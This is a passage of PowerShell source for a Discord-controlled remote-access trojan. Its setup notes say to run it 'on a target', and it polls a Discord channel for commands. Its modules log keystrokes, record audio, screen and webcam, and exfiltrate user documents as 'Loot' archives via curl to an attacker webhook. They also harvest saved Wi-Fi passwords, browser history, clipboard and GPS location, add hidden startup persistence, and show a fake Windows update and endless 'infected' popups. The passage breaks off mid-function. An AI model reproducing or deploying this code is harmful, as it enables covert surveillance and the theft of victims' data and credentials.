<# ============================================= Beigeworm's Discord C2 Client ========================================================

**SYNOPSIS**
Using a Discord bot along with discords API and a webhook to Act as a Command and Control Platform.

INFORMATION
This script uses a discord bot along with discords API and a webhook to create a chat that can control a windows pc.
Every 10 seconds it will check for a new message in chat and interpret it as a custom command / module in powershell.

SETUP
1. make a discord bot at https://discord.com/developers/applications/
2. add the bot to your discord server
3. create a webhook in the desired channel on your server. ( channel-settings/integrations )
3. Change $dc below to your webhook URL eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
4. Change $tk below with your bot token
5. Change $ch below to the channel id of your webhook.

USAGE
1. Setup the script
2. Run the script on a target.
3. Check discord for 'waiting to connect..' message.
4. Edit the contents of your hosted file to contain 'options' to get a list of modules
5. Do the same with any other command listed - To run that module.

EXTRA
You can add custom scripting / commands - edit the hoted file to contain your custom powershell script.

Killswitch
Edit file contents to 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and return to waiting for commands.
#>

# =============================================================================== SETUP VARIABLES ===================================================================================

# CHANGE below and add your details (only if not defined in a stageer)
$hookurl = "$dc" # eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
$token = "$tk" # make sure your bot is in the same server as the webhook
$chan = "$ch" # make sure the bot AND webhook can access this channel

$version = "1.3.1" # Check version and update
$parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
$response = $null
$previouscmd = $null
$authenticated = 0
$timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"

# Shortened webhook detection
if ($hookurl.Ln -ne 121){$hookurl = (irm $hookurl).url}

# remove restart stager (if present)
if(Test-Path "C:\Windows\Tasks\service.vbs"){
    rm -path "C:\Windows\Tasks\service.vbs" -Force
}

Function Options {
    $embed = @{
        "title" = "Discord C2 Options"
        "description" = @"
``````Commands List:``````
- **Message**: Send a message window to the User (!user popup!)
- **SpeechToText**: Send audio transcript to Discord
- **Systeminfo**: Send System info as text file to Discord
- **FolderTree**: Save folder trees to file and send to Discord
- **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
- **NearbyWifi**: Show nearby wifi networks (!user popup!)

- **AddPersistance**: Add this script to startup.
- **RemovePersistance**: Remove Poshcord from startup
- **IsAdmin**: Check if the session is admin
- **AttemptElevate**: Attempt to restart script as admin (!user popup!)

- **RecordAudio**: Record microphone and send to Discord
- **RecordScreen**: Record Screen and send to Discord
- **TakePicture**: Send a webcam picture and send to Discord
- **Exfiltrate**: Send various files. (see ExtraInfo)
- **Upload**: Upload a file. (see ExtraInfo)
- **Screenshot**: Sends a screenshot of the desktop and send to Discord
- **Keycapture**: Capture Keystrokes and send to Discord

- **FakeUpdate**: Spoof Windows-10 update screen using Chrome
- **SendHydra**: Never ending popups (use killswitch) to stop

- **ExtraInfo**: Get a list of further info and command examples
- **Kill**: Stop a running module (eg. Keycapture / Exfiltrate)
- **Pause**: Pause the current authenticated session
- **Close**: Close this session
"@
        "color" = 16711680  # Red color
    }

    $jsonsys = @{
        "username" = $env:COMPUTERNAME
        "embeds" = @($embed)
    } | ConvertTo-Json

    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function ExtraInfo {
$embed = @{
    "title" = "Exfiltrate and Upload Command Examples"
    "description" = @"
``````Example Commands``````

**Default PS Commands:**
> PS> ``whoami`` (Returns Powershell commands)

**Exfiltrate Command Examples:**
> PS> ``Exfiltrate -Path Documents -Filetype png``
> PS> ``Exfiltrate -Filetype log``
> PS> ``Exfiltrate``
Exfiltrate only will send many pre-defined filetypes
from all User Folders like Documents, Downloads etc..

**Upload Command Example:**
> PS> ``Upload -Path C:/Path/To/File.txt``
Use 'FolderTree' command to show all files

**Enumerate-LAN Example:**
> PS> ``EnumerateLAN -Prefix 192.168.1.``
This Eg. will scan 192.168.1.1 to 192.168.1.254

**Message Example:**
> PS> ``Message 'Your Message Here!'``

**Record Examples:**
> PS> ``RecordAudio -t 100`` (number of seconds to record)
> PS> ``RecordScreen -t 100`` (number of seconds to record)

**Kill Command modules:**
- Keycapture
- Exfiltrate
- SendHydra
- SpeechToText
"@
    "color" = 16711680  # Red color
}

    $json = @{
        "username" = $env:COMPUTERNAME
        "embeds" = @($embed)
    } | ConvertTo-Json
    
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $json
}

Function FolderTree{
    tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
    tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
    tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
    $FilePath ="$env:temp/TreesOfKnowledge.zip"
    Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt -DestinationPath $FilePath
    sleep 1
    curl.exe -F file1=@"$FilePath" $hookurl | Out-Null
    rm -Path $FilePath -Force
    Write-Output "Done."
}

Function Message([string]$Message){
    msg.exe * $Message
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Message Sent to User..`` :arrows_counterclockwise:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function Upload{
param ([string[]]$Path)
    if (Test-Path -Path $path){
        $extension = [System.IO.Path]::GetExtension($path)
        if ($extension -eq ".exe" -or $extension -eq ".msi") {
            $tempZipFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($path))
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $tempZipFilePath)
            curl.exe -F file1=@"$tempZipFilePath" $hookurl | Out-Null
            sleep 1
            Rm -Path $tempZipFilePath -Recurse -Force
        }else{
            curl.exe -F file1=@"$Path" $hookurl | Out-Null
        }
    }
}

Function FakeUpdate {
    $tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "C:\Windows\System32\scrnsave.scr"
WshShell.Run "chrome.exe --new-window -kiosk https://fakeupdate.net/win8", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
    $tobat | Out-File -FilePath $pth -Force
    sleep 1
    Start-Process -FilePath $pth
    sleep 3
    Remove-Item -Path $pth -Force
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Fake-Update Sent..`` :arrows_counterclockwise:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function NearbyWifi {
    $showNetworks = explorer.exe ms-availablenetworks:
    sleep 4
    $wshell = New-Object -ComObject wscript.shell
    $wshell.AppActivate('explorer.exe')
    $tab = 0
    while ($tab -lt 6){
        $wshell.SendKeys('{TAB}')
        sleep -m 100
        $tab++
    }
    $wshell.SendKeys('{ENTER}')
    sleep -m 200
    $wshell.SendKeys('{TAB}')
    sleep -m 200
    $wshell.SendKeys('{ESC}')
    $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
    $Wifi = ($NearbyWifi|Out-String)
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "``$Wifi``"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function EnumerateLAN{
param ([string]$Prefix)
    if ($Prefix.Length -eq 0){Write-Output "Use -prefix to define the first 3 parts of an IP Address eg. Enumerate-LAN -prefix 192.168.1";sleep 1 ;return}
    $FileOut = "$env:temp\Computers.csv"
    1..255 | ForEach-Object {
        $ipAddress = "$Prefix.$_"
        Start-Process -WindowStyle Hidden ping.exe -ArgumentList "-n 1 -l 0 -f -i 2 -w 100 -4 $ipAddress"
        }
    $Computers = (arp.exe -a | Select-String "$Prefix.*dynam") -replace ' +', ',' |
                 ConvertFrom-Csv -Header Computername, IPv4, MAC, x, Vendor |
                 Select-Object IPv4, MAC
    $Computers | Export-Csv $FileOut -NoTypeInformation
    $data = Import-Csv $FileOut
    $data | ForEach-Object {
        $mac = $_.'MAC'
        $apiUrl = "https://api.macvendors.com/$mac"
        $manufacturer = (Invoke-RestMethod -Uri $apiUrl).Trim()
        Start-Sleep -Seconds 1
        $_ | Add-Member -MemberType NoteProperty -Name "manufacturer" -Value $manufacturer -Force
        }
    $data | Export-Csv $FileOut -NoTypeInformation
    $data | ForEach-Object {
        try {
            $ip = $_.'IPv4'
            $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
            $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $hostname -Force
        } 
        catch {
            $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value "Error: $($_.Exception.Message)"  
        }
    }
    $data | Export-Csv $FileOut -NoTypeInformation
    $results = Get-Content -Path $FileOut -Raw
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$results"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
    rm -Path $FileOut
}

Function SendHydra {
    Add-Type -AssemblyName System.Windows.Forms
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Hydra Sent..`` :arrows_counterclockwise:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
    function Create-Form {
        $form = New-Object Windows.Forms.Form;$form.Text = "  __--** YOU HAVE BEEN INFECTED BY HYDRA **--__ ";$form.Font = 'Microsoft Sans Serif,12,style=Bold';$form.Size = New-Object Drawing.Size(300, 170);$form.StartPosition = 'Manual';$form.BackColor = [System.Drawing.Color]::Black;$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog;$form.ControlBox = $false;$form.Font = 'Microsoft Sans Serif,12,style=bold';$form.ForeColor = "#FF0000"
        $Text = New-Object Windows.Forms.Label;$Text.Text = "Cut The Head Off The Snake..`n`n    ..Two More Will Appear";$Text.Font = 'Microsoft Sans Serif,14';$Text.AutoSize = $true;$Text.Location = New-Object System.Drawing.Point(15, 20)
        $Close = New-Object Windows.Forms.Button;$Close.Text = "Close?";$Close.Width = 120;$Close.Height = 35;$Close.BackColor = [System.Drawing.Color]::White;$Close.ForeColor = [System.Drawing.Color]::Black;$Close.DialogResult = [System.Windows.Forms.DialogResult]::OK;$Close.Location = New-Object System.Drawing.Point(85, 100);$Close.Font = 'Microsoft Sans Serif,12,style=Bold'
        $form.Controls.AddRange(@($Text, $Close));return $form
    }
    while ($true) {
        $form = Create-Form
        $form.StartPosition = 'Manual'
        $form.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
        $result = $form.ShowDialog()
    
        $messages = PullMsg
        if ($messages -match "kill") {
            $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Hydra Stopped`` :octagonal_sign:"} | ConvertTo-Json
            Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
            $previouscmd = $response
            break
        }
        if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
            $form2 = Create-Form
            $form2.StartPosition = 'Manual'
            $form2.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
            $form2.Show()
        }
        $random = (Get-Random -Minimum 0 -Maximum 2)
        Sleep $random
    }
}

Function SpeechToText {
    Add-Type -AssemblyName System.Speech
    $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
    $grammar = New-Object System.Speech.Recognition.DictationGrammar
    $speech.LoadGrammar($grammar)
    $speech.SetInputToDefaultAudioDevice()
    
    while ($true) {
        $result = $speech.Recognize()
        if ($result) {
            $results = $result.Text
            Write-Output $results
            $jsonsys = @{"username" = $env:COMPUTERNAME ; "content" = $results} | ConvertTo-Json
            irm -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body $jsonsys
        }
        $messages = PullMsg
        if ($messages -match "kill") {
        break
        }
    }
}

Function RecordAudio{
param ([int[]]$t)
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)){  
        GetFfmpeg
    }
    sleep 1
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording audio for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
    Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
    function getFriendlyName($id) {$reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id";return (get-ItemProperty $reg).FriendlyName}
    $id1 = [audio]::GetDefault(1);$MicName = "$(getFriendlyName $id1)"; Write-Output $MicName
    $mp3Path = "$env:Temp\AudioClip.mp3"
    if ($t.Length -eq 0){$t = 10}
    .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $t -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $mp3Path
    curl.exe -F file1=@"$mp3Path" $hookurl | Out-Null
    sleep 1
    rm -Path $mp3Path -Force
}

Function RecordScreen{
param ([int[]]$t)
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)){  
        GetFfmpeg
    }
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
    
    $mkvPath = "$env:Temp\ScreenClip.mkv"
    if ($t.Length -eq 0){$t = 10}
    .$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $mkvPath
    curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
    sleep 1
    rm -Path $mkvPath -Force
}

Function AddPersistance{
    $newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
    $scriptContent | Out-File -FilePath $newScriptPath -force
    sleep 1
    if ($newScriptPath.Length -lt 100){
        "`$dc = `"$hookurl`"" | Out-File -FilePath $newScriptPath -Force
        "`$tk = `"$token`"" | Out-File -FilePath $newScriptPath -Force -Append
        "`$ch = `"$chan`"" | Out-File -FilePath $newScriptPath -Force -Append
        i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
        sleep 1
        Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
        }
    $tobat = @'
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\PowerShell\copy.ps1""", 0, True
'@
    $pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
    $tobat | Out-File -FilePath $pth -Force
    rm -path "$env:TEMP\temp.ps1" -Force
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Persistance Added!`` :white_check_mark:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function RemovePersistance{
    rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
    rm -Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Persistance Removed!`` :octagonal_sign:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function Exfiltrate {
    param ([string[]]$FileType,[string[]]$Path)
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":file_folder: ``Exfiltration Started..`` :file_folder:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
    $maxZipFileSize = 25MB
    $currentZipSize = 0
    $index = 1
    $zipFilePath ="$env:temp/Loot$index.zip"
    If($Path -ne $null){
        $foldersToSearch = "$env:USERPROFILE\"+$Path
    }else{
        $foldersToSearch = @("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
    }
    If($FileType -ne $null){
        $fileExtensions = "*."+$FileType
    }else {
        $fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
    }
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
    foreach ($folder in $foldersToSearch) {
        foreach ($extension in $fileExtensions) {
            $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
            foreach ($file in $files) {
                $fileSize = $file.Length
                if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                    $zipArchive.Dispose()
                    $currentZipSize = 0
                    curl.exe -F file1=@"$zipFilePath" $hookurl | Out-Null
                    Sleep 1
                    Remove-Item -Path $zipFilePath -Force
                    $index++
                    $zipFilePath ="$env:temp/Loot$index.zip"
                    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                }
                $entryName = $file.FullName.Substring($folder.Length + 1)
                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                $currentZipSize += $fileSize
                $messages = PullMsg
                if ($messages -match "kill") {
                    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":file_folder: ``Exfiltration Stopped`` :octagonal_sign:"} | ConvertTo-Json
                    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
                    $previouscmd = $response
                    break
                }
            }
        }
    }
    $zipArchive.Dispose()
    curl.exe -F file1=@"$zipFilePath" $hookurl | Out-Null
    sleep 5
    Remove-Item -Path $zipFilePath -Force
}

Function SystemInfo{
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``Gathering System Information for $env:COMPUTERNAME`` :computer:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
Add-Type -AssemblyName System.Windows.Forms
# WMI Classes
$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
$userInfo = Get-WmiObject -Class Win32_UserAccount
$processorInfo = Get-WmiObject -Class Win32_Processor
$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
$userInfo = Get-WmiObject -Class Win32_UserAccount
$videocardinfo = Get-WmiObject Win32_VideoController
$Hddinfo = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem, @{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } ;$Hddinfo=($Hddinfo| Out-String) ;$Hddinfo = ("$Hddinfo").TrimEnd("")
$RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
$processor = "$($processorInfo.Name)"
$gpu = "$($videocardinfo.Name)"
$DiskHealth = Get-PhysicalDisk | Select-Object DeviceID, FriendlyName, OperationalStatus, HealthStatus; $DiskHealth = ($DiskHealth | Out-String)
$ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
# User Information
$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
$email = (Get-ComputerInfo).WindowsRegisteredOwner
$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
$userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
$OSString = "$($systemInfo.Caption)"
$OSArch = "$($systemInfo.OSArchitecture)"
$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
$users = "$($userInfo.Name)"
$userString = "`nFull Name : $($userInfo.FullName)"
$clipboard = Get-Clipboard
# System Information
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table; $usbdevices = ($COMDevices| Out-String)
$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath; $process = ($process| Out-String)
$service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}; $service = ($service | Out-String)
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize; $software = ($software| Out-String)
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
$pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw ;$pshistory = ($pshistory | Out-String) 
$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime;$RecentFiles = ($RecentFiles | Out-String)
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;$Width = $Screen.Width;$Height = $Screen.Height;$screensize = "${width} x ${height}"
# Nearby WiFi Networks
$showNetworks = explorer.exe ms-availablenetworks:
sleep 4
$wshell = New-Object -ComObject wscript.shell
$wshell.AppActivate('explorer.exe')
$tab = 0
while ($tab -lt 6){
$wshell.SendKeys('{TAB}')
$tab++
}
$wshell.SendKeys('{ENTER}')
$wshell.SendKeys('{TAB}')
$wshell.SendKeys('{ESC}')
$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
$Wifi = ($NearbyWifi|Out-String)
# Current System Metrics
function Get-PerformanceMetrics {
    $cpuUsage = Get-Counter '\Processor(_Total)\% Processor Time' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
    $memoryUsage = Get-Counter '\Memory\% Committed Bytes In Use' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
    $diskIO = Get-Counter '\PhysicalDisk(_Total)\Disk Transfers/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
    $networkIO = Get-Counter '\Network Interface(*)\Bytes Total/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue

    return [PSCustomObject]@{
        CPUUsage = "{0:F2}" -f $cpuUsage.CookedValue
        MemoryUsage = "{0:F2}" -f $memoryUsage.CookedValue
        DiskIO = "{0:F2}" -f $diskIO.CookedValue
        NetworkIO = "{0:F2}" -f $networkIO.CookedValue
    }
}
$metrics = Get-PerformanceMetrics
$PMcpu = "CPU Usage: $($metrics.CPUUsage)%"
$PMmu = "Memory Usage: $($metrics.MemoryUsage)%"
$PMdio = "Disk I/O: $($metrics.DiskIO) transfers/sec"
$PMnio = "Network I/O: $($metrics.NetworkIO) bytes/sec"
# History and Bookmark Data
$Expression = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
$Paths = @{
    'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
    'edge_bookmarks'    = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    'opera_bookmarks'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
}
$Browsers = @('chrome', 'edge', 'firefox', 'opera')
$DataValues = @('history', 'bookmarks')
$outpath = "$env:temp\Browsers.txt"
foreach ($Browser in $Browsers) {
    foreach ($DataValue in $DataValues) {
        $PathKey = "${Browser}_${DataValue}"
        $Path = $Paths[$PathKey]

        $Value = Get-Content -Path $Path | Select-String -AllMatches $Expression | % {($_.Matches).Value} | Sort -Unique

        $Value | ForEach-Object {
            [PSCustomObject]@{
                Browser  = $Browser
                DataType = $DataValue
                Content = $_
            }
        } | Out-File -FilePath $outpath -Append
    }
}
$Value = Get-Content -Path $outpath
$Value = ($Value | Out-String)
# Saved WiFi Network Info
$outssid = ''
$a=0
$ws=(netsh wlan show profiles) -replace ".*:\s+"
foreach($s in $ws){
    if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){
        $ssid=$s.Trim()
        if($s -Match ":"){
            $ssid=$s.Split(":")[1].Trim()
            }
        $pw=(netsh wlan show profiles name=$ssid key=clear)
        $pass="None"
        foreach($p in $pw){
            if($p -Match "Key Content"){
            $pass=$p.Split(":")[1].Trim()
            $outssid+="SSID: $ssid | Password: $pass`n-----------------------`n"
            }
        }
    }
    $a++
}
# GPS Location Info
Add-Type -AssemblyName System.Device
$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
$GeoWatcher.Start()
while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
	Sleep -M 100
}  
if ($GeoWatcher.Permission -eq 'Denied'){
    $GPS = "Location Services Off"
}
else{
	$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude
	$GL = $GL -split " "
	$Lat = $GL[0].Substring(11) -replace ".$"
	$Lon = $GL[1].Substring(10) -replace ".$"
    $GPS = "LAT = $Lat LONG = $Lon"
}

function EnumNotepad{
$appDataDir = [Environment]::GetFolderPath('LocalApplicationData')
$directoryRelative = "Packages\Microsoft.WindowsNotepad_*\LocalState\TabState"
$matchingDirectories = Get-ChildItem -Path (Join-Path -Path $appDataDir -ChildPath 'Packages') -Filter 'Microsoft.WindowsNotepad_*' -Directory
foreach ($dir in $matchingDirectories) {
    $fullPath = Join-Path -Path $dir.FullName -ChildPath 'LocalState\TabState'
    $listOfBinFiles = Get-ChildItem -Path $fullPath -Filter *.bin
    foreach ($fullFilePath in $listOfBinFiles) {
        if ($fullFilePath.Name -like '*.0.bin' -or $fullFilePath.Name -like '*.1.bin') {
            continue
        }
        $seperator = ("=" * 60)
        $SMseperator = ("-" * 60)
        $seperator | Out-File -FilePath $outpath -Append
        $filename = $fullFilePath.Name
        $contents = [System.IO.File]::ReadAllBytes($fullFilePath.FullName)
        $isSavedFile = $contents[3]
        if ($isSavedFile -eq 1) {
            $lengthOfFilename = $contents[4]
            $filenameEnding = 5 + $lengthOfFilename * 2
            $originalFilename = [System.Text.Encoding]::Unicode.GetString($contents[5..($filenameEnding - 1)])
            "Found saved file : $originalFilename" | Out-File -FilePath $outpath -Append
            $filename | Out-File -FilePath $outpath -Append
            $SMseperator | Out-File -FilePath $outpath -Append
            Get-Content -Path $originalFilename -Raw | Out-File -FilePath $outpath -Append

        } else {
            "Found an unsaved tab!" | Out-File -FilePath $outpath -Append
            $filename | Out-File -FilePath $outpath -Append
            $SMseperator | Out-File -FilePath $outpath -Append
            $filenameEnding = 0
            $delimeterStart = [array]::IndexOf($contents, 0, $filenameEnding)
            $delimeterEnd = [array]::IndexOf($contents, 3, $filenameEnding)
            $fileMarker = $contents[($delimeterStart + 2)..($delimeterEnd - 1)]
            $fileMarker = -join ($fileMarker | ForEach-Object { [char]$_ })
            $originalFileBytes = $contents[($delimeterEnd + 9 + $fileMarker.Length)..($contents.Length - 6)]
            $originalFileContent = ""
            for ($i = 0; $i -lt $originalFileBytes.Length; $i++) {
                if ($originalFileBytes[$i] -ne 0) {
                    $originalFileContent += [char]$originalFileBytes[$i]
                }
            }
